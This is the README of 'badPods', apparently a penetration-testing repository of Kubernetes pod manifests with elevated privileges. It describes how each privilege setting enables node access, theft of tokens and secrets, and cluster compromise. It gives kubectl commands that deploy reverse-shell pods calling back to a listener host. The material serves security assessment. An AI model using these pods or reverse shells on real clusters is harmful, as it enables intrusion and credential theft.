# badPods

A collection of easy to use pod yamls with different elevated privileges. The goal is to help you quickly understand the impact of allowing specific security sensitive pod specifications by giving you the tools to demonstrate exploitation.

## Background
Occasionally, containers within pods need access to privileged resources on the host, so the Kubernetes pod spec allows for it. However, this level of access should be granted with extreme caution. Administrators have ways to prevent the creation of pods with these security sensitive pod specifications, but it is not always clear what the real-world security implications of allowing certain attributes is. 

## Prerequisites
In order to be successful in this attack path, you'll need the following: 

1. Access to a cluster 
1. Permission to create pods in at least one namespace. If you can exec into them that makes life easier.  
1. A pod security policy (or other pod admission controller's logic) that allows pods to be created with one or more security sensitive attributes, or no pod security policy / pod admission controller at all


## Pods you can exec into

Notes | type| yaml | readme
-- | -- | -- | --
Everything allowed| pod | [yaml](yaml/everything-allowed/pod-everything-allowed.yaml) | [readme](yaml/everything-allowed/README.md)
Privileged and hostPid | pod | [yaml](yaml/priv-and-hostpid/README.md) | [readme](yaml/priv-and-hostpid/README.md)
Privileged only | pod | [yaml](yaml/priv-only/pod-priv-only.yaml) | [readme](yaml/priv-only/README.md)
hostPid only | pod | [yaml](yaml/hostpid-only/pod-hostpid-only.yaml) | [readme](yaml/hostpid-only/README.md)
hostNetwork only | pod | [yaml](yaml/hostnetwork-only/pod-hostnetwork-only.yaml) | [readme](yaml/hostnetwork-only/README.md)
hostIPC only | pod | [yaml](yaml/hostipc-only/pod-hostipc-only.yaml) | [readme](yaml/hostipc-only/README.md)

## Reverse shell versions of each pod

Notes | type| yaml | readme
-- | -- | -- | --
Everything allowed - reverse shell| pod | [yaml](yaml/everything-allowed/pod-everything-allowed-revshell.yaml) |  [readme](yaml/everything-allowed/README.md)
Privileged and hostPid - reverse shell | pod | [yaml](yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml) | [readme](yaml/priv-and-hostpid/README.md)
Privileged only - reverse shell| pod | [yaml](yaml/priv-only/pod-priv-only-revshell.yaml) | [readme](yaml/priv-only/README.md)
hostPid only - reverse shell | pod | [yaml](yaml/hostipc-only/pod-hostipc-only-revshell.yaml) | [readme](yaml/hostpid-only/README.md)
hostNetwork only - reverse shell | pod | [yaml](yaml/hostnetwork-only/pod-hostnetwork-only-revshell.yaml) | [readme](yaml/hostnetwork-only/README.md)
hostIPC only - reverse shell | pod | [yaml](yaml/hostipc-only/README.md) | [readme](yaml/hostipc-only/README.md)

 

# Impact - What's the worst that can happen?

## Everything Allowed
[everything-allowed](yaml/everything-allowed/README.md) 

### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
Once you create the pod, you can exec into it and you will have root access on the node running your pod. One promising privesc path is available if you can schedule your pod to run on the master node (not possible in a cloud managed environment). Even if you can only schedule your pod on the worker node, you can access the node's kubelet creds, you can create mirror pods in any namespace, and you can access any secret mounted within any pod on the node you are on, and then it to gain access to other namespaces or to create new cluster role bindings. 
 
## HostPID and Privileged
[hostPID + privileged](yaml/priv-and-hostpid/README.md) 

### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
Same as above 

## Privileged only
[privileged=true](yaml/priv-only/README.md) 

### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
While can eventually get an interactive shell on the node like in the cases above, you start with non-interactive command execution and you'll have to upgrade it if you want interactive access. The privesc paths are the same as above.


## hostPath only
[Unrestricted hostmount (/)](yaml/hostpath-only/README.md)

### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
While you don't have access to host process or network namespaces, having access to the full filesystem allows you to perform the same types of privesc paths outlined above. Hunt for tokens from other pods running on the node and hope you find a token associated with a highly privileged service account.


## hostPid only
[hostpid](yaml/hostpid-only/README.md)

### What's the worst that can happen?
Unlikely but possible path to cluster compromise 

### How?
You can run `ps -aux` on the host. Look for any process that includes passwords, tokens, or keys, and use them to privesc within the cluster, to services supported by the cluster, or to services that cluster hosted applications are communicating with. It is a long shot, but you might find a kubernetes token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster-admin.   You can also kill any process on the node (DOS).  


## hostNetwork only
[hostnetwork](yaml/hostnetwork-only/README.md) 

### What's the worst that can happen?
Potential path to cluster compromise 

### How?
Sniff unencrypted traffic on any interface on the host and potentially find service account tokens or other sensitive information that is transmitted over unencrypted channels. <br> You can also reach services that only listen on the host's loopback interface or are otherwise blocked by nework polices. These services might turn into a fruitful privesc path. 


## hostIPC only
[hostipc](yaml/hostipc-only/README.md) 


### What's the worst that can happen?
Not seen often - but potential limited compromise 

### How?
If any process on the host, or any processes within a pod is using the host's interprocess communication mechanisms (shared memory, semaphore arrays, message queues, etc.), you will be able to read/write to those same mechanisms. That said, with things like message queues, even if you can read something in the queue, reading it is a destructive action that will remove it from the queue, so beware. 


**Caveat:** There are many kubernetes specific security controls available to administrators that can reduce the impact of pods created with the following privileges. As is always the case with penetration testing, your milage may vary.



## Usage
 Each resource in the `yamls` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  

### Clone the repo
```bash
git clone https://github.com/BishopFox/badPods
cd badPods
```

### Create the pods 

```bash
# Create all pods (or at least try to create them)
kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
kubectl apply -f ./yaml/priv-only/pod-priv-only.yaml
kubectl apply -f ./yaml/hostpath-only/pod-hostpath-only.yaml
kubectl apply -f ./yaml/hostpid-only/pod-hostpid-only.yaml 
kubectl apply -f ./yaml/hostnetwork-only/pod-hostnetwork-only.yaml
kubectl apply -f ./yaml/hostipc-only/pod-hostipc-only.yaml
```

### Reverse Shell version of each pod
If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the envsubst command. Remember to spin up all of your listeners first:

```bash
HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/hostpid-only/pod-hostpid-only-revshell.yaml  | kubectl apply -f -
HOST="10.0.0.1" PORT="3113" envsubst < ./yaml/hostnetwork-only/pod-hostnetwork-only-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath-only/pod-hostpath-only-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostipc-only/pod-hostipc-only-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
```

# References
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
* https://twitter.com/mauilion/status/1129468485480751104
* https://twitter.com/_fel1x/status/1151487051986087936
* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
* https://github.com/kvaps/kubectl-node-shell


# Acknowledgements 
Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), and [Mark Manning](https://twitter.com/antitree) for publicly sharing so much knowledge about Kubernetes security. 
